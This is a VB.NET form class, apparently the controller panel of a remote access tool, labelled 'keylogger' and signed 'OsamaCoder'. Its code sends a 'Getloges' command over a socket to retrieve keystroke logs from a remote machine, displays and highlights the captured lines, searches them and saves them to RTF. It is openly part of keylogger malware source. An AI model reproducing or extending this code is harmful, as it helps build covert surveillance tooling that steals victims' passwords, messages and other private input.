Public Class keylogger

    '####################################################################################
    '### Coded By Umbrella-Win7 - OsamaCoder#############################################
    '### في ذمتك إلين يوم القيامة إذا لم تذكر حقوقي فلن أسامحك إلين يوم القيامة #
    '####################################################################################

    Public sock As Integer

    Private Sub Button2_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button2.Click
        T1.Clear()
        Form1.S.Send(sock, "Getloges")
    End Sub



    Public Sub Getloges(ByVal loges As String)
        Dim strX As String() = Strings.Split(loges, ChrW(13) & ChrW(10))
        For Each Str As String In strX
            insert(Str)
        Next
        T1.ScrollToCaret()
    End Sub

    Public Sub insert(ByVal T As String)
        If T.StartsWith("#| ") And T.EndsWith(" |#") Then
            'T1.SelectionFont = New Font(T1.Font, FontStyle.Bold) if you whant
            T1.SelectionColor = Color.DodgerBlue
            T = T.Replace("#| ", "")
            T = T.Replace(" |#", "")
            T1.AppendText((" " & T & " " & ChrW(13) & ChrW(10)))
        Else
            T1.SelectionColor = Color.Black
            T1.AppendText((T & ChrW(13) & ChrW(10)))
        End If

    End Sub


    Private Sub Button3_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button3.Click
        If T1.Text.Contains(TextBox1.Text) = True Then
            Dim x As Integer = T1.Text.IndexOf(TextBox1.Text, T1.Text.IndexOf(TextBox1.Text))
            Dim y As Integer = TextBox1.Text.Length
            T1.Select(x, y)
            T1.SelectionColor = Color.Red
            T1.SelectionFont = New Font(T1.Font, FontStyle.Bold)
        Else
            TextBox1.Text = ""
        End If
    End Sub

    Private Sub Button1_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button1.Click
        Dim x As New SaveFileDialog With {.Filter = "(*.rtf)|*.rtf"}
        If x.ShowDialog = Windows.Forms.DialogResult.OK Then
            T1.SaveFile(x.FileName)
        End If
    End Sub

    Private Sub keylogger_Load(sender As System.Object, e As System.EventArgs) Handles MyBase.Load

    End Sub

    Private Sub Button4_Click(sender As System.Object, e As System.EventArgs) Handles Button4.Click
        T1.Text = ""
    End Sub
End Class